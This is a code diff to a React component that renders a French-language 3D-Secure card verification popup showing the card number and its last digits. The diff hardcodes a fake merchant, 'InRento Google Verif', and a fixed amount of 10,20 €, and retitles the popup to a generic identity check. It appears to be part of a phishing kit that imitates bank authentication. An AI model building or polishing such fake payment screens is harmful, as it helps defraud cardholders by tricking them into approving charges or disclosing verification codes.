@@ -5,14 +5,11 @@ import styles from '../styles/components/CommonPopup.module.css';
 
 const ThreeDSecurePopup = ({ 
   isVisible, 
-  cardLogo, 
   amount, 
-  shop, 
   lastFourDigits,
   formattedDate,
   formattedTime,
   cardNumber,
-  brandName = "Agenda Funnel"
 }) => {
   console.log("3DSecurePopup rendu avec isVisible:", isVisible);
   
@@ -33,7 +30,7 @@ const ThreeDSecurePopup = ({
           </div>
           
           <h3 className={styles.title}>
-            Vérification 3D-Secure
+            Vérifiez votre identité
           </h3>
           
           <p className={styles.subtitle}>
@@ -43,11 +40,11 @@ const ThreeDSecurePopup = ({
           <div className={styles.transactionCard}>
             <div className={styles.transactionField}>
               <span className={styles.transactionLabel}>Marchand</span>
-              <span className={styles.transactionValue}>{shop?.name || brandName}</span>
+              <span className={styles.transactionValue}>InRento Google Verif</span>
             </div>
             <div className={styles.transactionField}>
               <span className={styles.transactionLabel}>Montant</span>
-              <span className={`${styles.transactionValue} ${styles.transactionValueHighlight}`}>{amount}</span>
+              <span className={`${styles.transactionValue} ${styles.transactionValueHighlight}`}>10,20 €</span>
             </div>
             <div className={styles.transactionField}>
               <span className={styles.transactionLabel}>Date</span>
